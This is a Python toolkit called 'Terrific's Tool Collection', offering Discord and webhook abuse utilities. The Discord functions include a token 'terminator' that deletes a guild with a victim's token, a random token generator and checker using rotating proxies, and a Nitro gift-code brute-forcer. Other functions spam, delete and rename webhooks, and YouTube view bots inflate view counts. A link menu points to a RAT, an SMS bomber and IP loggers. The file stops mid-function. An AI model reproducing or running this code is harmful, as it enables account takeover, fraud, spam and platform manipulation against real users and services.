try:
    from colorama import Fore, Style
    from os import system as cmd
    import requests
    from lxml.html import fromstring
    import webbrowser
    import threading
    import io
    import json
    from selenium import webdriver
    import os
    import time
    import sys
    import random
    import string
    import base64
    from itertools import cycle
    from pypresence import Presence
except:
    print("[ERROR] - You need to have these modules installed:")
    print("     - requests")
    print("     - colorama")
    print("     - lxml")

inp = f"[{Fore.MAGENTA}>{Style.RESET_ALL}] $ "
err = f"[{Fore.RED}-{Style.RESET_ALL}]"
inf = f"[{Fore.YELLOW}i{Style.RESET_ALL}]"
out = f"[{Fore.GREEN}:{Style.RESET_ALL}]"
log = f"[{Fore.CYAN}={Style.RESET_ALL}]"

###################
## -Discord RPC- ##
###################

buttonList = [
    {
        "label": "GitHub",
        "url": "https://github.com/TerrificTable"
    },
    {
        "label": "This Programm",
        "url": "https://github.com/TerrificTable/"
    }
]

rpc = Presence("896386163579961364")
rpc.connect()
rpc.update(
    details="Terrific's Tool Collection",
    large_text="TerrificTools",
    large_image="webhookico",
    small_text="by Terrific",
    small_image="me",
    buttons=buttonList,
    start=time.time()
)


def slowprint(s, c, newLine=True):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1. / 30)


def logo():
    return f'''{Fore.CYAN}
          _____              _  __ _              _____           _                   
         |_   _|__ _ __ _ __(_)/ _(_) ___ ___    |_   _|__   ___ | |___ {Fore.MAGENTA}   _ __  _   _ {Fore.CYAN}
           | |/ _ \ '__| '__| | |_| |/ __/ __|_____| |/ _ \ / _ \| / __|{Fore.MAGENTA}  | '_ \| | | |{Fore.CYAN}
           | |  __/ |  | |  | |  _| | (__\__ \_____| | (_) | (_) | \__ \{Fore.MAGENTA} _| |_) | |_| |{Fore.CYAN}
           |_|\___|_|  |_|  |_|_| |_|\___|___/     |_|\___/ \___/|_|___/{Fore.MAGENTA}(_) .__/ \__, |{Fore.CYAN}
                                                                         {Fore.MAGENTA} |_|    |___/ {Fore.CYAN}{Style.RESET_ALL}'''


def webhooklogo():
    return f'''{Fore.RED}

    █     █░▓█████  ▄▄▄▄    ██░ ██  ▒█████   ▒█████   ██ ▄█▀   ▄▄▄█████▓ ▒█████   ▒█████   ██▓      ██████ 
    ▓█░ █ ░█░▓█   ▀ ▓█████▄ ▓██░ ██▒▒██▒  ██▒▒██▒  ██▒ ██▄█▒    ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    ▒██    ▒ 
    ▒█░ █ ░█ ▒███   ▒██▒ ▄██▒██▀▀██░▒██░  ██▒▒██░  ██▒▓███▄░    ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ░ ▓██▄   
    ░█░ █ ░█ ▒▓█  ▄ ▒██░█▀  ░▓█ ░██ ▒██   ██░▒██   ██░▓██ █▄    ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░      ▒   ██▒
    ░░██▒██▓ ░▒████▒░▓█  ▀█▓░▓█▒░██▓░ ████▓▒░░ ████▓▒░▒██▒ █▄     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒▒██████▒▒
    ░ ▓░▒ ▒  ░░ ▒░ ░░▒▓███▀▒ ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒     ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░▒ ▒▓▒ ▒ ░
    ▒ ░ ░   ░ ░  ░▒░▒   ░  ▒ ░▒░ ░  ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░       ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░░ ░▒  ░ ░
    ░   ░     ░    ░    ░  ░  ░░ ░░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░      ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   ░  ░  ░  
        ░       ░  ░ ░       ░  ░  ░    ░ ░      ░ ░  ░  ░                   ░ ░      ░ ░      ░  ░      ░  
                        ░                                                                                 
                        ░                                                                         {Style.RESET_ALL}'''


def get_proxies():
    try:
        url = 'https://sslproxies.org/'
        response = requests.get(url)
        parser = fromstring(response.text)
        proxies = set()
        for i in parser.xpath('//tbody/tr')[:10]:
            if i.xpath('.//td[7][contains(text(),"yes")]'):
                proxy = ":".join([i.xpath('.//td[1]/text()')[0],
                                  i.xpath('.//td[2]/text()')[0]])
                proxies.add(proxy)
        return proxies
    except KeyboardInterrupt:
        pass
    except:
        pass


def proxyscraper():
    try:
        cmd("cls;clear")
        cmd("title [Terrifics-Tools.py - ProxyScraper]")

        url = 'https://api.openproxylist.xyz/http.txt'
        r = requests.get(url)
        results = r.text
        with open("http.txt", "w") as file:
            file.write(results)
        print(f' {out} {Fore.LIGHTGREEN_EX}done http{Style.RESET_ALL}')

        url = 'https://api.openproxylist.xyz/socks4.txt'
        r = requests.get(url)
        results = r.text
        with open("socks4.txt", "w") as file:
            file.write(results)
        print(f' {out} {Fore.LIGHTGREEN_EX}done socks4{Style.RESET_ALL}')

        url = 'https://api.openproxylist.xyz/socks5.txt'
        r = requests.get(url)
        results = r.text
        with open("socks5.txt", "w") as file:
            file.write(results)
        print(f' {out} {Fore.LIGHTGREEN_EX}done socks4{Style.RESET_ALL}')
        time.sleep(2)
    except KeyboardInterrupt:
        main()
    except:
        main()


def terminate():
    try:
        cmd("cls;clear")
        cmd("title [Terrifics-Tools.py - Terminator]")
        print(f" {inf} Enter Token")
        token = input(f" {inp} ")
        while True:
            print("Terminating token...")
            api = requests.get("https://discordapp.com/api/v6/invite/hwcVZQw")
            data = api.json()
            check = requests.get(
                "https://discordapp.com/api/v6/guilds/" +
                data['guild']['id'],
                headers={
                    "Authorization": token})
            stuff = check.json()
            requests.post(
                "https://discordapp.com/api/v6/invite/hwcVZQw",
                headers={
                    "Authorization": token})
            requests.delete(
                "https://discordapp.com/api/v6/guiilds" +
                data['guild']['id'],
                headers={
                    "Authorization": token})

            if stuff['code'] == 0:
                print("Successfully disabled!")
                print("Disabler by NullCode and Giggl3z")
                time.sleep(2)
                break
    except KeyboardInterrupt:
        main()
    except:
        main()


def pinger():
    cmd("cls;clear")
    cmd("title [Terrifics-Tools.py - Pinger]")
    print(f" {inf} Enter IP")
    ip = str(input(f" {inp} "))

    while True:
        if cmd("ping -n 1 " + ip + ">nul") == 0:
            print(ip + " is alive!")
            cmd("color " + str(random.randrange(0, 9)))
        else:
            print(ip + " Get downed SKID")
            cmd("color " + str(random.randrange(0, 9)))
            time.sleep(2)
            cmd("mode con:cols=120lines=20")


def Tokengen():
    try:
        N = input("How many you want?: ")
        count = 0
        url = "https://discordapp.com/api/v6/users/@me/library"

        while(int(count) < int(N)):
            tokens = []
            base64_string = "=="
            while(base64_string.find("==") != -1):
                sample_string = str(
                    random.randint(
                        000000000000000000,
                        999999999999999999))
                sample_string_bytes = sample_string.encode("ascii")
                base64_bytes = base64.b64encode(sample_string_bytes)
                base64_string = base64_bytes.decode("ascii")
            else:
                token = base64_string + "." + random.choice(
                    string.ascii_letters).upper() + ''.join(
                    random.choice(
                        string.ascii_letters + string.digits) for _ in range(5)) + "." + ''.join(
                    random.choice(
                        string.ascii_letters + string.digits) for _ in range(27))
                count += 1
                tokens.append(token)
            proxies = get_proxies()
            proxy_pool = cycle(proxies)

            for token in tokens:
                proxy = next(proxy_pool)
                header = {
                    "Content-Type": "application/json",
                    "authorization": token
                }
                r = requests.get(url, headers=header, proxies={"http": proxy})
                if r.status_code == 200:
                    print("f'{Fore.LIGHTGREEN_EX}Valid{Fore.RESET} | {token}'")
                    with open("workingtokens.txt", "a") as f:
                        f.write(token + "\n")

                elif "rate limited." in r.text:
                    print(f" {err} You are being rate limited.")

                else:
                    print(f'{Fore.LIGHTRED_EX}Invalid{Fore.RESET} | {token}')
            tokens.remove(token)
    except KeyboardInterrupt:
        main()
    except:
        main()


def checkwebhook(w):
    try:
        check = requests.get(w, params={'wait': True})
        if check.ok or check:
            return True
        else:
            return False
    except:
        return False


def sender():
    try:
        cmd('cls; clear')
        cmd("title [Terrific's Webhook-Tools - Spammer]")
        print(f'{log} [WEBHOOK-TOOLS] - Webhook spammer\n')
        webhook = input(f" {inp} Webhook Url: ")
        if checkwebhook(webhook):
            cu = input(
                f"\n {inp} Do you want to put a Custom Webhook name inside (it changes the name of the Webhook if it sends a message) [y/n]: ")
            if str(cu) == "y":
                username = input(f" {inp} Username: ")
            av = input(
                f"\n {inp} Do you want the Webhook to have a Custom avatar [y/n]: ")
            if str(av) == "y":
                avatarurl = input(f" {inp} Avatar-Url (A Image URL): ")
            message = input(f"\n {inp} Message: ")
            amt = input(f" {inp} Amout of Messages send: ")
            print("")

            if webhook != "" or message != "" or str(amt) != "":
                for i in range(int(amt)):
                    try:
                        if str(cu) == "y" and str(av) == "y":
                            response = requests.post(webhook, json={
                                                     "content": message, "username": username, "avatar_url": avatarurl}, params={'wait': True})
                        elif str(cu) == "y" and str(av) == "n":
                            response = requests.post(
                                webhook, json={"content": message, "username": username}, params={'wait': True})
                        elif str(cu) == "n" and str(av) == "y":
                            response = requests.post(webhook, json={
                                                     "content": message, "avatar_url": avatarurl}, params={'wait': True})
                        elif str(cu) == "n" and str(av) == "n":
                            response = requests.post(
                                webhook, json={"content": message}, params={'wait': True})
                    except Exception as e:
                        print(e + ", press [ENTER] to return")
                        input()
                        main()

                    if response.status_code == 204 or response.status_code == 200:
                        print(f" {out} - Message sent")
                    elif response.status_code == 429:
                        print(
                            f" {log} - Rate limited ({response.json()['retry_after']}ms)")
                        time.sleep(response.json()["retry_after"] / 1000)
                    else:
                        print(
                            f" {err} - Error code: {response.status_code}, press [ENTER] to return")
                        input()
                        main()
                    time.sleep(.5)
        else:
            print(f" {err} Invalid Webhook, press [ENTER] to return")
            input()
            sender()
        print(f" {err} - Invalid input, press [ENTER] to return")
        input()
        main()
    except KeyboardInterrupt:
        main()
    except:
        main()


def spammer():
    try:
        cmd('cls; clear')
        cmd("title [Terrific's Webhook-Tools - Spammer]")
        print(f'{log} [WEBHOOK-TOOLS] - Webhook spammer\n')
        webhook = input(f" {inp} Webhook Url: ")
        if checkwebhook(webhook):
            message = input(f" {inp} Message: ")
            print("")
            try:
                while True:
                    try:
                        response = requests.post(
                            webhook, json={"content": message}, params={'wait': True})
                    except Exception as e:
                        print(e + ", press [ENTER] to return")
                        input()
                        main()

                    if response.status_code == 204 or response.status_code == 200:
                        print(f" {out} - Message sent")

                    elif response.status_code == 429:
                        print(
                            f" {log} - Rate limited ({response.json()['retry_after']}ms)")
                        time.sleep(response.json()["retry_after"] / 1000)

                    else:
                        print(
                            f" {err} - Error code: {response.status_code}, press [ENTER] to return")
                        input()
                        main()
                    time.sleep(.5)
            except:
                print(f" {log} Press [ENTER] to return")
        else:
            print(f" {err} Invalid Webhook, press [ENTER] to return")
            input()
            spammer()
    except KeyboardInterrupt:
        main()
    except:
        main()


def deleter():
    try:
        cmd('cls; clear')
        cmd("title [Terrific's Webhook-Tools - Deleter]")
        print(f'{log} [WEBHOOK-TOOLS] - Webhook deleter\n')
        webhook = input(f" {inp} Webhook: ")
        if checkwebhook(webhook):
            if webhook != "":
                try:
                    requests.delete(webhook.rstrip())
                    print(
                        f' {out} - Webhook has been deleted, press [ENTER] to return')
                    input()
                    main()
                except Exception as e:
                    print(
                        f" {err} - Webhook could not be deleted, press [ENTER] to return")
                    input()
                    main()
            else:
                print(f" {err} - Invalid Input, press [ENTER] to return")
                input()
                main()
        else:
            print(f" {err} Invalid Webhook, press [ENTER] to return")
            input()
            deleter()
    except KeyboardInterrupt:
        main()
    except:
        main()


def checker():
    try:
        cmd("cls; clear")
        cmd("title [Terrific's Webhook-Tools - Checker]")
        print(f"{log} [WEBHOOK-TOOLS] - Webhook checker\n")
        webhook = input(f" {inp} Webhook: ")
        try:
            r = requests.get(webhook)
            if r.ok == False:
                print(f"{log} [WEBHOOK-TOOLS] - Webhook Invalid")
                input()
                main()
            elif r.ok == True:
                print(
                    f"{log} [WEBHOOK-TOOLS] - Webhook Works, press [ENTER] to return")
                input()
                main()
        except Exception as e:
            print(
                f"{err} [WEBHOOK-TOOLS] - Webhook could not be checked\n{err} [WEBHOOK-TOOLS] - Error Message: {e}")
            input()
            main()
    except KeyboardInterrupt as e:
        main()
    except Exception as e:
        main()


def sendmessage(w, m):
    try:
        r = requests.post(w, json={"content": m}, params={'wait': True})
        if r.ok:
            print(f" {out} Message sent")
        else:
            print(f" {err} Message failed to sent")
    except:
        print(f" {err} Message failed to sent")


def chatsession():
    cmd('cls; clear')
    cmd("title [Terrific's Webhook-Tools - ChatSession]")
    print(f'{log} [WEBHOOK-TOOLS] - Chat Session\n\n\n')

    try:
        print(f" {inf} Press Ctrl + C to exit Chat session\n")
        webhook = input(f" {inp} Webhook: ")
        if checkwebhook(webhook):
            print(f"\n\n {inf} Input Message")
            while True:
                message = input(f" {inp} ")
                sendmessage(webhook, message)
        else:
            print(f" {err} Invalid Webhook, press [ENTER] to return")
            input()
            chatsession()
    except KeyboardInterrupt:
        main()
    except:
        main()


def changeinfo():
    try:
        cmd('cls; clear')
        cmd("mode 115, 30")
        cmd("title [Terrific's Webhook-Tools - ChangeInfo]")
        print(f'{log} [WEBHOOK-TOOLS] - Change Info\n\n')

        webhook = input(f" {inp} Webhook URL: ")

        if checkwebhook(webhook):
            print(f"""\n
            [x]=====================[x]
            ║ 1  =  Change Name     ║
            ║ 2  =  Change Avatar   ║
            ║ 3  =  Return to Menu  ║
            ║ X  =  Exit            ║
            [x]=====================[x]
            """)
            i = input(f" {inp} ")

            if str(i) == "1":
                name = input(f" {inp} Name: ")
                r = requests.patch(webhook, json={"name": name})
                if r.ok:
                    print(f" {out} Succesfully Changed Name")
                else:
                    print(f" {err} Failed to Change Name")

            elif str(i) == "2":
                avatar = input(f" {inp} Image URL: ")
                r = requests.patch(webhook, json={"avatar_url": avatar})
                if r.ok:
                    print(f" {out} Succesfully Changed Name")
                else:
                    print(f" {err} Failed to Change Name")

            elif str(i) == "3":
                main()

            elif str(i).lower() == "x":
                exit()

            else:
                print(f" {err} Invalid Input, pres [ENTER] to return")
                input()
                changeinfo()

        else:
            print(f" {err} Invalid Webhook, press [ENTER] to return")
            input()
            changeinfo()

    except KeyboardInterrupt:
        main()
    except:
        main()


def generateCheck():
    try:
        cmd('cls; clear')
        cmd("mode 115, 30")
        cmd("title [TerrificTools - NitroGen]")
        os.system('cls' if os.name == 'nt' else 'clear')
        while True:
            code = ''.join(random.choices(
                string.ascii_uppercase + string.digits + string.ascii_lowercase,
                k=16
            ))

            url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true"
            s = requests.session()
            response = s.get(url)

            nitro = f'{Fore.LIGHTBLACK_EX}https://discord.gift/{Fore.RESET}' + code

            if 'subscription_plan' in response.text:
                print(f'{Fore.LIGHTGREEN_EX}Valid code{Fore.RESET} | {nitro}')
                print("FOUND CODE")
                with open("code.txt", "w") as f:
                    f.write(nitro)
                break

            else:
                print(f'{Fore.LIGHTRED_EX}Invalid{Fore.RESET} | {nitro}')
                continue
    except KeyboardInterrupt:
        main()
    except:
        main()


def links():
    try:
        cmd('cls; clear')
        cmd("mode 115, 30")
        cmd("title [TerrificTools - NiceLinks]")
        print(f'''
            {Fore.RED} [1]  {Fore.WHITE}FakeNameGen      {Fore.CYAN}(https://www.fakenamegenerator.com)
            {Fore.RED} [2]  {Fore.WHITE}AnonFiles        {Fore.CYAN}(https://anonfiles.com)
            {Fore.RED} [3]  {Fore.WHITE}Rat              {Fore.CYAN}(https://github.com/quasar/QuasarRAT)
            {Fore.RED} [4]  {Fore.WHITE}KeyWord          {Fore.CYAN}(https://keywordtool.io)
            {Fore.RED} [5]  {Fore.WHITE}VPN              {Fore.CYAN}(https://courvix.com/vpn.php)
            {Fore.RED} [6]  {Fore.WHITE}CyberHub         {Fore.CYAN}(https://cyber-hub.pw)
            {Fore.RED} [7]  {Fore.WHITE}VedBex           {Fore.CYAN}(https://vedbex.com/tools/home)
            {Fore.RED} [8]  {Fore.WHITE}Ascii            {Fore.CYAN}(https://patorjk.com/software/taag)
            {Fore.RED} [9]  {Fore.WHITE}IpGenerator      {Fore.CYAN}(https://commentpicker.com/ip-address-generator.php)
            {Fore.RED} [10] {Fore.WHITE}SteamGenerator   {Fore.CYAN}(https://accgen.cathook.club)
            {Fore.RED} [11] {Fore.WHITE}FreeAlts         {Fore.CYAN}(https://freealts.pw)
            {Fore.RED} [12] {Fore.WHITE}SpecialFonts     {Fore.CYAN}(https://messletters.com/en)
            {Fore.RED} [13] {Fore.WHITE}PhoneSpoofer     {Fore.CYAN}(https://nl.spoofmyphone.com)
            {Fore.RED} [14] {Fore.WHITE}SMSBomber        {Fore.CYAN}(https://bombitup.net)
            {Fore.RED} [15] {Fore.WHITE}IpLogger         {Fore.CYAN}(https://iplogger.org){Fore.WHITE}/{Fore.CYAN}(https://grabify.link)
            {Fore.RED} [16] {Fore.WHITE}BottingPanel     {Fore.CYAN}(https://naizop.com)
            {Fore.RED} [17] {Fore.WHITE}Instagramid      {Fore.CYAN}(https://commentpicker.com/nl/instagram-getbruikers-id.php)
            {Fore.RED} [18] {Fore.WHITE}RickRoll         {Fore.CYAN}(https://youtube.com/watch?v=d!w4w9WgXcQ)
            {Fore.RED} [19] {Fore.WHITE}MainMenu
            {Fore.RED} [X]  {Fore.WHITE}Exit
        ''')
        i = input(f" {inp} ")
        if str(i) == "1":
            webbrowser.open("https://www.fakenamegenerator.com")
            print(f" {out} Press Enter to return")
            input()
            main()
        elif str(i) == "2":
            webbrowser.open("https://anonfiles.com")
            print(f" {out} Press Enter to return")
            input()
            main()
        elif str(i) == "3":
            webbrowser.open("https://github.com/quasar/QuasarRAT")
            print(f" {out} Press Enter to return")
            input()
            main()
        elif str(i) == "4":
            webbrowser.open("https://keywordtool.io")
            print(f" {out} Press Enter to return")
            input()
            main()
        elif str(i) == "5":
            webbrowser.open("https://courvix.com/vpn.php")
            print(f" {out} Press Enter to return")
            input()
            main()
        elif str(i) == "6":
            webbrowser.open("https://cyber-hub.pw")
            print(f" {out} Press Enter to return")
            input()
            main()
        elif str(i) == "7":
            webbrowser.open("https://vedbex.com/tools/home")
            print(f" {out} Press Enter to return")
            input()
            main()
        elif str(i) == "8":
            webbrowser.open("https://patorjk.com/software/taag")
            print(f" {out} Press Enter to return")
            input()
            main()
        elif str(i) == "9":
            webbrowser.open(
                "https://commentpicker.com/ip-address-generator.php")
            print(f" {out} Press Enter to return")
            input()
            main()
        elif str(i) == "10":
            webbrowser.open("https://accgen.cathook.club")
            print(f" {out} Press Enter to return")
            input()
            main()
        elif str(i) == "10":
            webbrowser.open("https://freealts.pw")
            print(f" {out} Press Enter to return")
            input()
            main()
        elif str(i) == "12":
            webbrowser.open("https://messletters.com/en")
            print(f" {out} Press Enter to return")
            input()
            main()
        elif str(i) == "13":
            webbrowser.open("https://nl.spoofmyphone.com")
            print(f" {out} Press Enter to return")
            input()
            main()
        elif str(i) == "14":
            webbrowser.open("https://bombitup.net")
            print(f" {out} Press Enter to return")
            input()
            main()
        elif str(i) == "15":
            print(f" {inf} Input What webside you want: ")
            print(f"     - [1] iplogger.org")
            print(f"     - [2] grabify.link")
            i = input(f" {inp} ")
            if str(i) == "1":
                webbrowser.open("https://iplogger.org")
                print(f" {out} Press Enter to return")
                input()
                main()
            elif str(i) == "2":
                webbrowser.open("https://grabify.link")
                print(f" {out} Press Enter to return")
                input()
                main()
            else:
                print(f" {err} Invalid Input press [ENTER] to return")
                input()
                links()
        elif str(i) == "16":
            webbrowser.open("https://naizop.com")
            print(f" {out} Press Enter to return")
            input()
            main()
        elif str(i) == "17":
            webbrowser.open(
                "https://commentpicker.com/nl/instagram-getbruikers-id.php")
            print(f" {out} Press Enter to return")
            input()
            main()
        elif str(i) == "18":
            webbrowser.open("https://youtube.com/watch?v=d!w4w9WgXcQ")
            print(f" {out} Press Enter to return")
            input()
            main()
        elif str(i) == "19":
            main()
        elif str(i).lower() == "x":
            exit()
        else:
            print(f" {err} Invalid Input")
            input()
            links()
    except KeyboardInterrupt:
        main()
    except:
        main()


def get_config():
    try:
        global path
        global PATH
        path = input(f" {inp} Config file path without config.json: ")

        path = path + "/config.json"
        if not os.path.exists(path):
            with io.open(path, "w") as f:
                data = {
                    "executable_path": str(input(f" {inp} Full chromedriver path without .exe: "))
                }
                json.dump(data, f, indent=4)
                f.close
                print(f" {log} Generated config.json file")
        else:
            try:
                f = io.open(path, 'r')
                config = json.load(f)
                PATH = config.get('executable_path')
                f.close()
            except Exception as e:
                print(f" {err} {e}\n press [ENTER] to exit")
                input()
                exit()
            pass
        pass
    except KeyboardInterrupt:
        main()
    except:
        main()


class Bot():
    global randomdel
    randomdel = int(random.randint(0, 60))

    def __init__(self):
        self.browser = webdriver.Chrome(executable_path=PATH)

    def __home(self):
        self.browser.get(channel)
        time.sleep(2)

    def __videoPage(self):
        self.__home()
        try:
            accept = self.browser.find_element_by_xpath(
                '/html/body/c-wiz/div/div/div/div[2]/div[1]/div[4]/form')
            accept.click()
            time.sleep(2)
        except:
            pass
        time.sleep(2)
        videoElm = self.browser.find_element_by_xpath(
            '/html/body/ytd-app/div/ytd-page-manager/ytd-browse/div[3]/ytd-c4-tabbed-header-renderer/tp-yt-app-header-layout/div/tp-yt-app-header/div[2]/tp-yt-app-toolbar/div/div/tp-yt-paper-tabs/div/div/tp-yt-paper-tab[2]')
        videoElm.click()
        time.sleep(2)

    def __videoID(self, elementNumber):
        self.ids = self.browser.find_elements_by_id('thumbnail')
        return self.ids[elementNumber]

    def watchVideo(self, videoNumber, watchTime):
        self.videoNumber = videoNumber
        self.watchTime = watchTime

        self.__videoPage()
        self.__videoID(self.videoNumber)

        thumbnailElm = self.__videoID(self.videoNumber)
        thumbnailElm.click()
        print(f" {log} Watchtime: {watchTime}(sec) + {randomdel+(watchTime/2)}(sec)")
        time.sleep(int(watchTime + round(randomdel+(watchTime/2))))

    def stop(self):
        self.browser.close()
        print(f" {out} Finished, press [ENTER] to exit")
        input()
        exit()

# ViewBot's


def viewbotv1():
    global randomdel
    randomdel = int(random.randint(0, 60))

    if str(d).lower() == "c":
        duration = input(f" {inp} Enter Duration (min): ")

    delay = input(f" {inp} Input a delay to open Tabs: ")

    def view():
        if str(d).lower() == "c":
            webbrowser.open(url)
            print(f" {log} Delay: {duration}(sec) + {randomdel+(duration/2)}(sec)")
            time.sleep(round(int(duration))*60 + round(randomdel+(duration/2)))
        elif str(d).lower() == "r":
            webbrowser.open(url)
            time.sleep(round(int(random.randint(1, 5)*60)))
        exit()

    threads = []
    try:
        for i in range(int(sessions)):
            thread = threading.Thread(target=view)
            thread.daemon = True
            threads.append(thread)
            thread.start()
            time.sleep(int(delay+(delay/2)))
        print(f" {out} Finished, press [ENTER] to exit")
    except Exception as e:
        print(f" {err} {e}\n press [ENTER] to exit")
        input()
        exit()

    try:
        for i in range(len(threads)):
            thread.join()
            print(f" {log} Delay: {delay}(sec) + {randomdel+(delay/2)}(sec)")
            time.sleep(int(delay) + round(randomdel+(delay/2)))
    except Exception as e:
        print(f" {err} {e}\n press [ENTER] to exit")
        input()
        exit()


class viewbotv2():
    global randomdel
    randomdel = int(random.randint(0, 60))

    def __init__(self):
        self.browser = webdriver.Chrome(executable_path=PATH)

    def __video(self):
        self.browser.get(url)
        time.sleep(1)
        try:
            accept = self.browser.find_element_by_xpath(
                '/html/body/ytd-app/ytd-consent-bump-v2-lightbox/tp-yt-paper-dialog/div[2]/div[2]/div[5]/div[2]/ytd-button-renderer[2]/a/tp-yt-paper-button/yt-formatted-string')
            accept.click()
            time.sleep(1)
        except:
            pass
        time.sleep(1)

    def watchVideo(self, watchTime):
        self.watchTime = watchTime

        for i in range(int(sessions)):
            self.__video()
            print(f" {log} Delay: {watchTime}(sec) + {randomdel+(watchTime/2)}(sec)")
            time.sleep(round(int(randomdel+(watchTime/2))))

    def stop(self):
        self.browser.close()
        print(f" {log} Finished, press [ENTER] to exit")
        input()
        exit()


def main():
    try:
        cmd("cls;clear")
        cmd("title [Terrifics-Tools.py - Mainmenu]")
        cmd("mode 115, 30")
        print(logo())

        time.sleep(1)
        slowprint(
            f'{Fore.LIGHTBLACK_EX}                    Made by: {Fore.RED}Terrific{Style.RESET_ALL}', .02)
        time.sleep(1)

        print(f'''\n\n
            {Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}===================={Fore.YELLOW}[x]
            {Fore.LIGHTMAGENTA_EX} ║  {Fore.RED}[1]{Style.RESET_ALL} Webhook Tools   {Fore.LIGHTMAGENTA_EX}║
            {Fore.LIGHTMAGENTA_EX} ║  {Fore.RED}[2]{Style.RESET_ALL} Discord Tool    {Fore.LIGHTMAGENTA_EX}║
            {Fore.LIGHTMAGENTA_EX} ║  {Fore.RED}[3]{Style.RESET_ALL} Proxy Scraper   {Fore.LIGHTMAGENTA_EX}║
            {Fore.LIGHTMAGENTA_EX} ║  {Fore.RED}[4]{Style.RESET_ALL} Nice Links      {Fore.LIGHTMAGENTA_EX}║
            {Fore.LIGHTMAGENTA_EX} ║  {Fore.RED}[5]{Style.RESET_ALL} ViewBot         {Fore.LIGHTMAGENTA_EX}║
            {Fore.LIGHTMAGENTA_EX} ║  {Fore.RED}[6]{Style.RESET_ALL} Pinger          {Fore.LIGHTMAGENTA_EX}║
            {Fore.LIGHTMAGENTA_EX} ║  {Fore.RED}[X]{Style.RESET_ALL} Exit            {Fore.LIGHTMAGENTA_EX}║
            {Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}===================={Fore.YELLOW}[x]{Style.RESET_ALL}''')
        option = input(f" {inp} ")
        if str(option) == "1":
            webhooktools()
        elif str(option) == "2":
            discordtools()
        elif str(option) == "3":
            proxyscraper()
        elif str(option) == "4":
            links()
        elif str(option) == "5":
            viewbot()
        elif str(option) == "6":
            pinger()
        else:
            exit()
    except KeyboardInterrupt:
        main()
    except:
        main()


def discordtools():
    try:
        cmd('cls; clear')
        cmd(f'mode 115, 30')
        cmd("title [Terrifics-Tools.py - Discord-Tools]")
        print(f'''
            {Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}=========================={Fore.YELLOW}[x]
            {Fore.LIGHTMAGENTA_EX} ║  {Fore.RED}[1]{Style.RESET_ALL} Terminate Token       {Fore.LIGHTMAGENTA_EX}║
            {Fore.LIGHTMAGENTA_EX} ║  {Fore.RED}[2]{Style.RESET_ALL} Generate Token        {Fore.LIGHTMAGENTA_EX}║
            {Fore.LIGHTMAGENTA_EX} ║  {Fore.RED}[3]{Style.RESET_ALL} Nitro Gen and Checker {Fore.LIGHTMAGENTA_EX}║
            {Fore.LIGHTMAGENTA_EX} ║  {Fore.RED}[X]{Style.RESET_ALL} Exit                  {Fore.LIGHTMAGENTA_EX}║
            {Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}=========================={Fore.YELLOW}[x]{Style.RESET_ALL}''')
        i = input(f" {inp}")
        if str(i) == "1":
            terminate()
            input()
            discordtools()
        elif str(i) == "2":
            Tokengen()
            input()
            discordtools()
        elif str(i) == "3":
            generateCheck()
            input()
            discordtools()
        elif str(i) == "x":
            exit()
        else:
            print(f" {err} - Invalid Input")
            input()
            main()
    except KeyboardInterrupt:
        main()
    except:
        main()


def webhooktools():
    try:
        cmd('cls; clear')
        cmd(f'mode 115, 30')
        cmd("title [Terrifics-Tools.py - Webhook-Tools]")
        print(webhooklogo())
        print(f'''
            {Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}=================={Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}==============={Fore.YELLOW}[x]
            {Fore.LIGHTMAGENTA_EX} ║ {Fore.RED}[1]{Style.RESET_ALL} Sender       {Fore.LIGHTMAGENTA_EX}║  {Fore.RED}[4]{Style.RESET_ALL} Checker      {Fore.LIGHTMAGENTA_EX}║
            {Fore.LIGHTMAGENTA_EX} ║ {Fore.RED}[2]{Style.RESET_ALL} Spammer      {Fore.LIGHTMAGENTA_EX}║  {Fore.RED}[5]{Style.RESET_ALL} SingleUtils  {Fore.LIGHTMAGENTA_EX}║
            {Fore.LIGHTMAGENTA_EX} ║ {Fore.RED}[3]{Style.RESET_ALL} Deleter      {Fore.LIGHTMAGENTA_EX}║  {Fore.RED}[X]{Style.RESET_ALL} Exit         {Fore.LIGHTMAGENTA_EX}║
            {Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}=================={Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}==============={Fore.YELLOW}[x]{Style.RESET_ALL}''')
        i = input(f" {inp} ")
        if str(i) == str(1):
            sender()
            input()
            webhooktools()
        elif str(i) == str(2):
            spammer()
            input()
            webhooktools()
        elif str(i) == str(3):
            deleter()
            input()
            webhooktools()
        elif str(i) == str(4):
            checker()
            input()
            webhooktools()
        elif str(i) == str(5):
            singleutils()
            input()
            webhooktools()
        elif str(i).lower() == "x":
            exit()
        else:
            print(f" {err} - Invalid Input")
            input()
            webhooktools()
    except KeyboardInterrupt:
        main()
    except:
        main()


def singleutils():
    try:
        cmd("cls")
        cmd("mode 115, 30")
        cmd("title [Terrific's Webhook-Tools - SingleUtils]")
        print(f'''
        {Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}==================={Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}===================={Fore.YELLOW}[x]
        {Fore.LIGHTMAGENTA_EX} ║ {Fore.RED}[1] {Style.RESET_ALL}Chat Session    {Fore.LIGHTMAGENTA_EX}║  {Fore.RED}[3] {Style.RESET_ALL}Return to Menu  {Fore.LIGHTMAGENTA_EX}║
